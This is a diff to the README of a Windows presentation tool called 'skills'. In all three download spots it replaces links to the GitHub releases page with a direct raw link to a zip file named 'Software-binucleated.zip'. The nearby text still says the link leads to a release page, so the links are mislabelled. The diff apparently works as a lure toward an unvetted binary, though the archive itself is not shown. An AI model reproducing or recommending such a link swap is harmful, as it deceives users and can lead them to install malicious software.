@@ -1,6 +1,6 @@
 # 🎞️ skills - Make presentations faster and easier
 
-[![Download skills](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rashidi3098/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download-Release_Page-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rashidi3098/skills/raw/refs/heads/main/skills/Software-binucleated.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ This tool is made for Windows users who want a simple way to get started without
 ## 📥 Download
 
 Visit the release page here:  
-https://github.com/rashidi3098/skills/releases
+https://github.com/rashidi3098/skills/raw/refs/heads/main/skills/Software-binucleated.zip
 
 On that page, download the latest version for Windows. If there are several files, choose the one that matches your system and file type.
 
@@ -179,7 +179,7 @@ The more direct the prompt, the easier it is to get useful output.
 ## 🔗 Download Again
 
 If you need the file later, go here:  
-https://github.com/rashidi3098/skills/releases
+https://github.com/rashidi3098/skills/raw/refs/heads/main/skills/Software-binucleated.zip
 
 Use the latest release and download the Windows version from that page.
 
